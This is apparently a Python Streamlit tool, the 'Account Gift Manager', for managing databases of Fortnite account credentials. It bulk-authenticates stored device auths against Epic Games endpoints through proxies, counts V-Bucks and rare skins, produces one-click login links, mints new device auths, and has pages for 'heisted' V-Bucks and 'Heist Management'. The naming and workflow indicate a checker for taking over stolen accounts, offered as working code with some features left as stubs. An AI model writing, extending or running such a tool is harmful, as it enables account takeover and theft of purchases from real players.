import streamlit as st
import json
import os
import requests
import random
from dateutil import parser
import asyncio
import httpx
import pyperclip
from timeit import default_timer as timer
from PIL import Image
from io import BytesIO

# Configure page settings
st.set_page_config(
    page_title="Account Gift Manager",
    page_icon="🎁",
    layout="wide"
)

# Initialize session state
if 'loaded_db' not in st.session_state:
    st.session_state.loaded_db = None
if 'passed' not in st.session_state:
    st.session_state.passed = 0
if 'failed' not in st.session_state:
    st.session_state.failed = 0
if 'total' not in st.session_state:
    st.session_state.total = 0
if 'accs_sorted' not in st.session_state:
    st.session_state.accs_sorted = []
if 'lock' not in st.session_state:
    st.session_state.lock = asyncio.Lock()

# Proxy list from original file
PROXIES = [
    "4.175.121.88:80",
    "72.169.67.61:87",
    # ... (rest of proxy list)
]

# Sidebar navigation
st.sidebar.title("Navigation")
page = st.sidebar.radio("Select Page", [
    "Home",
    "Load DB",
    "DB Manager",
    "Check Heisted Vbucks",
    "Sort Account Files",
    "Get Account Info",
    "Heist Management"
])

async def convert_ios_to_android(accounts):
    st.write("Converting iOS accounts to Android...")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    async def convert_account(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient):
        # First authenticate with iOS credentials
        url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
        ios_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'basic {ios_token}'
        }
        
        data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"
        
        try:
            # Get iOS access token
            req = await client.post(url=url, headers=headers, data=data)
            if req.status_code != 200:
                st.session_state.failed += 1
                return None
            
            access_token = req.json()["access_token"]
            
            # Get exchange code
            exchange_url = 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange'
            exchange_headers = {
                'Authorization': f'Bearer {access_token}'
            }
            
            exchange_req = await client.get(url=exchange_url, headers=exchange_headers)
            exchange_code = exchange_req.json()['code']
            
            # Convert to Android using exchange code
            android_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            android_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            android_data = f"grant_type=exchange_code&exchange_code={exchange_code}"
            
            android_req = await client.post(url=android_url, headers=android_headers, data=android_data)
            
            if android_req.status_code != 200:
                st.session_state.failed += 1
                return None
            
            android_token = android_req.json()["access_token"]
            android_account_id = android_req.json()["account_id"]
            
            # Generate new device auth
            device_auth_url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{android_account_id}/deviceAuth'
            device_auth_headers = {
                "Authorization": f'Bearer {android_token}',
                "Content-Type": "application/json"
            }
            
            device_auth_req = await client.post(url=device_auth_url, headers=device_auth_headers, data="{}")
            
            if device_auth_req.status_code != 200:
                st.session_state.failed += 1
                return None
            
            new_device_id = device_auth_req.json()["deviceId"]
            new_secret = device_auth_req.json()["secret"]
            
            # Get account details like the authenticate function
            profile_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {android_token}'
            }
            
            profile = await client.post(url=profile_url, headers=headers, data="{}")
            profile_data = profile.json()
            
            # Calculate vbucks
            vbucks = 0
            try:
                items = profile_data['profileChanges'][0]['profile']['items']
                for item in items:
                    if items[item]['templateId'][:12] == "Currency:Mtx":
                        vbucks += items[item]['quantity']
            except:
                vbucks = 0
            
            st.session_state.passed += 1
            
            return {
                "vbucks": vbucks,
                "account_id": account_id,
                "device_id": new_device_id,
                "secret": new_secret,
                "display_name": display_name
            }
            
        except Exception as e:
            st.error(f"Conversion error: {str(e)}")
            st.session_state.failed += 1
            return None

    async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
        tasks = []
        for account in accounts:
            task = convert_account(
                account_id=account["AccountId"],
                device_id=account["DeviceId"],
                secret=account["Secret"],
                display_name=account["DisplayName"],
                account=account,
                client=client
            )
            tasks.append(task)
        
        results = []
        for i, task in enumerate(asyncio.as_completed(tasks)):
            result = await task
            if result:
                results.append(result)
            progress = (i + 1) / len(tasks)
            progress_bar.progress(progress)
            status_text.text(f"Converted {i+1}/{len(tasks)} accounts")
    
    # Save the converted accounts
    if results:
        filename = os.path.basename(st.session_state.loaded_db).split("db.json")[0]
        output_path = f"./dbs/checked/android_checked_{filename}.json"
        with open(output_path, "w") as f:
            json.dump(results, f, indent=4)
        st.success(f"Successfully converted {len(results)} accounts. Saved to {output_path}")
    else:
        st.error("No accounts were successfully converted")

async def authenticate(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient):
    url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
    client_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'basic {client_token}'
    }
    
    data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"
    
    try:
        req = await client.post(url=url, headers=headers, data=data)
        st.session_state.total += 1
        
        if req.status_code != 200:
            st.session_state.failed += 1
            return None
            
        auth_info = req.json()
        access_token = auth_info["access_token"]
        display_name = auth_info["displayName"]

        # Get account details and vbucks
        profile_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'
        headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {access_token}'
        }
        
        composemcp = await client.post(url=profile_url, headers=headers, data="{}")
        composemcp = composemcp.json()

        # Calculate vbucks
        vbucks = 0
        try:
            items = composemcp['profileChanges'][0]['profile']['items']
            for item in items:
                if items[item]['templateId'][:12] == "Currency:Mtx":
                    vbucks += items[item]['quantity']
        except:
            vbucks = 0

        # Get BR profile for skins
        br_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1'
        br_profile = await client.post(url=br_url, headers=headers, data="{}")
        
        # Check for special skins
        special_skins = []
        composemcp = br_profile.text.lower()
        
        skin_checks = {
            "CID_703_Athena_Commando_M_Cyclone": "Travis Scott",
            "CID_434_Athena_Commando_F_StealthHonor": "Wonder",
            # Add all other skin checks here
        }

        for skin_id, skin_name in skin_checks.items():
            if skin_id.lower() in composemcp:
                special_skins.append(skin_name)

        st.session_state.passed += 1
        
        # Get exchange code for web link
        try:
            exchange_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
            exchange_headers = {"Authorization": f"Bearer {access_token}"}
            exchange_response = await client.get(exchange_url, headers=exchange_headers)
            token = exchange_response.json()["code"]
            web_link = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
        except:
            web_link = None

        return {
            "vbucks": vbucks,
            "account_id": account_id,
            "device_id": device_id,
            "secret": secret,
            "display_name": display_name,
            "web_link": web_link,
            "special_skins": special_skins,
            "skin_count": len(special_skins)
        }

    except Exception as e:
        st.error(f"Authentication error: {str(e)}")
        st.session_state.failed += 1
        return None

async def check_credentials(accounts, client_type="ios"):
    client_tokens = {
        "ios": "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=",
        "android": "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
    }
    
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
        tasks = []
        for account in accounts:
            task = authenticate(
                account_id=account["AccountId"],
                device_id=account["DeviceId"],
                secret=account["Secret"],
                display_name=account["DisplayName"],
                account=account,
                client=client
            )
            tasks.append(task)
        
        results = []
        for i, task in enumerate(asyncio.as_completed(tasks)):
            result = await task
            if result:
                results.append(result)
            progress = (i + 1) / len(tasks)
            progress_bar.progress(progress)
            status_text.text(f"Processed {i+1}/{len(tasks)} accounts")
    
    return sorted(results, key=lambda x: x['skin_count'], reverse=True)

def check_heisted_vbucks_page():
    st.title("Check Heisted V-Bucks")
    
    for file in os.listdir("./"):
        if file.startswith("added_") and file.endswith(".json"):
            account_id = file.replace("added_", "").replace(".json", "")
            
            if st.button(f"Check {account_id}"):
                try:
                    with open(file, "r") as f:
                        accounts = json.load(f)
                    total_vbucks = sum(acc.get("vbucks", 0) for acc in accounts)
                    st.success(f"Account {account_id} has {total_vbucks:,} V-Bucks available")
                except Exception as e:
                    st.error(f"Error checking account: {str(e)}")

def sort_account_files_page():
    st.title("Sort Account Files")
    
    if not st.session_state.loaded_db:
        st.warning("Please load a database first!")
        return
    
    sort_options = ["V-Bucks", "Skin Count", "Active Date"]
    sort_choice = st.selectbox("Sort by:", sort_options)
    
    if st.button("Sort"):
        try:
            with open(st.session_state.loaded_db, "r") as f:
                accounts = json.load(f)
            
            if sort_choice == "V-Bucks":
                sorted_accounts = sorted(accounts, key=lambda x: x.get("vbucks", 0), reverse=True)
            elif sort_choice == "Skin Count":
                sorted_accounts = sorted(accounts, key=lambda x: len(x.get("special_skins", [])), reverse=True)
            else:  # Active Date
                sorted_accounts = sorted(accounts, key=lambda x: parser.parse(x.get("last_br_match", "2000-01-01")), reverse=True)
            
            with open(st.session_state.loaded_db, "w") as f:
                json.dump(sorted_accounts, f, indent=4)
            
            st.success("Accounts sorted successfully!")
            
        except Exception as e:
            st.error(f"Error sorting accounts: {str(e)}")

def get_account_info_page():
    st.title("Get Account Info")
    
    account_id = st.text_input("Enter Account ID")
    
    if st.button("Get Info"):
        found = False
        for file in os.listdir("./dbs/checked/"):
            if not file.endswith(".json"):
                continue
                
            try:
                with open(f"./dbs/checked/{file}", "r") as f:
                    accounts = json.load(f)
                    
                for acc in accounts:
                    if acc["account_id"] == account_id:
                        found = True
                        st.json(acc)
                        if acc.get("web_link"):
                            st.text("Web link copied to clipboard")
                            pyperclip.copy(acc["web_link"])
                        break
                        
                if found:
                    break
                    
            except Exception as e:
                st.error(f"Error reading file {file}: {str(e)}")
                
        if not found:
            st.warning("Account not found in any database")

def home_page():
    st.title("Account Gift Manager")
    st.markdown("""
    Welcome to the Account Gift Manager! 🎁
    
    This tool helps you manage Fortnite accounts and gifts. Select an option from the sidebar to get started.
    
    ### Features:
    - Load and manage account databases
    - Check heisted V-Bucks
    - Sort account files
    - Get account information
    - Manage heists and gifts
    """)

def heist_management_page():
    st.title("Heist Management")
    
    tab1, tab2 = st.tabs(["Gift", "Auth Management"])
    
    with tab1:
        st.subheader("Gift Management")
        
        col1, col2 = st.columns(2)
        with col1:
            gift_to_id = st.text_input("Recipient Account ID")
            cosmetic = st.text_input("Cosmetic Name/ID")
            
        if st.button("Send Gift 🎁"):
            if not gift_to_id or not cosmetic:
                st.warning("Please fill in all fields")
                return
                
            try:
                # Gift logic here
                st.info("Gift sending functionality will be implemented")
            except Exception as e:
                st.error(f"Error sending gift: {str(e)}")
    
    with tab2:
        st.subheader("Auth Management")
        st.info("Auth management functionality will be implemented")

def load_db_page():
    st.title("Load Database")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("Checked DBs")
        for file in os.listdir("./dbs/checked/"):
            if file.endswith(".json"):
                if st.button(f"📁 {file}", key=f"checked_{file}"):
                    st.session_state.loaded_db = f"./dbs/checked/{file}"
                    st.success(f"Loaded database: {file}")
    
    with col2:
        st.subheader("Unchecked DBs")
        for file in os.listdir("./dbs/"):
            if file.endswith(".json"):
                if st.button(f"📁 {file}", key=f"unchecked_{file}"):
                    st.session_state.loaded_db = f"./dbs/{file}"
                    st.success(f"Loaded database: {file}")

def db_manager_page():
    st.title("Database Manager")
    
    if not st.session_state.loaded_db:
        st.warning("Please load a database first!")
        return
    
    st.subheader(f"Managing: {os.path.basename(st.session_state.loaded_db)}")
    
    col1, col2 = st.columns(2)
    
    with col1:
        if st.button("Check Credentials"):
            client_choice = st.radio("Select Client", ["iOS", "Android"])
            if st.button("Start Check"):
                try:
                    with open(st.session_state.loaded_db, "r") as f:
                        accounts = json.load(f)
                    if "sus" in accounts:
                        accounts = accounts["sus"]
                    asyncio.run(check_credentials(accounts, client_choice.lower()))
                except Exception as e:
                    st.error(f"Error checking credentials: {str(e)}")
    
    with col2:
        if st.button("Convert iOS to Android"):
            try:
                with open(st.session_state.loaded_db, "r") as f:
                    accounts = json.load(f)
                if "sus" in accounts:
                    accounts = accounts["sus"]
                asyncio.run(convert_ios_to_android(accounts))
            except Exception as e:
                st.error(f"Error converting accounts: {str(e)}")
def main():
    if page == "Home":
        home_page()
    elif page == "Load DB":
        load_db_page()
    elif page == "DB Manager":
        db_manager_page()
    elif page == "Check Heisted Vbucks":
        check_heisted_vbucks_page()
    elif page == "Sort Account Files":
        sort_account_files_page()
    elif page == "Get Account Info":
        get_account_info_page()
    elif page == "Heist Management":
        heist_management_page()

if __name__ == "__main__":
    main()